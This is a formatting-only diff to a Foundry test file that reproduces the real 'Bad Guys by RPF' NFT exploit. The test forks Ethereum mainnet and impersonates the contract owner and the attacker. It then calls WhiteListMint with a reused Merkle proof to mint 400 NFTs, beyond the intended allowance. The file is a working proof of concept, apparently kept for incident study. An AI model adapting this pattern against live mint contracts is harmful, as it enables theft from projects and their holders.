@@ -13,22 +13,21 @@ To understand more about NFT Merkle Proof - https://www.youtube.com/watch?v=67vk
 
 Etherscan tx - https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f
 
-forge test --contracts ./src/test/BadGuysbyRPF_exp.sol -vv
-*/
+forge test --contracts ./src/test/BadGuysbyRPF_exp.sol -vv*/
 
 contract BadGuysbyRPFExploit is DSTest {
-    
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade; //owner of Bad Guys by RPF
     address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;
-  
+
     IBadGuysRPFERC721 RPFContract = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
     bytes32[] merkleTree;
-    function setUp() public {
-        cheats.createSelectFork("mainnet", 15460093); //fork mainnet at 15460093 
 
-        // There should be an easier way to do this 
+    function setUp() public {
+        cheats.createSelectFork("mainnet", 15_460_093); //fork mainnet at 15460093
+
+        // There should be an easier way to do this
         // I tried passing it as whole array but did not work
         merkleTree.push(0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5);
         merkleTree.push(0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511);
@@ -48,7 +47,6 @@ contract BadGuysbyRPFExploit is DSTest {
     }
 
     function testExploit() public {
-        
         //quick hack to enable Minting in Block#15460093
         //In actual hack the Mint was live in Block#15460094
         cheats.prank(owner);
@@ -57,7 +55,7 @@ contract BadGuysbyRPFExploit is DSTest {
         console.log("[Before WhiteListMint] Attacker's Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));
 
         cheats.prank(attacker);
-        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF 
+        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF
 
         console.log("[After WhiteListMint]  Attacker's Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));
     }
